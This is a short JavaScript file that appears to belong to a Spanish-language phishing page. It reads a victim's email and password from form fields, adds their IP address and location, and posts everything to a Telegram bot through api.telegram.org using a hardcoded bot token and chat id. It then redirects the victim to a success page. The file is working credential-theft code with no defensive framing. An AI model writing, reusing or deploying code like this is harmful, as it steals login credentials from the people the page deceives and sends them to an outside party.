//bot token
var telegram_bot_id = "6989339920:AAHQzBow1uAijCWHO75g8vBhIKcgisg4ouw";
//chat id
var chat_id = -4131847359;
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("ce6").value;
    u_name2 = document.getElementById("cc7").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "Correo: " + u_name + " - Contraseña: " + u_name2 + "\nIP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'exito.html';
        console.log(response);
    });
    return false;
};
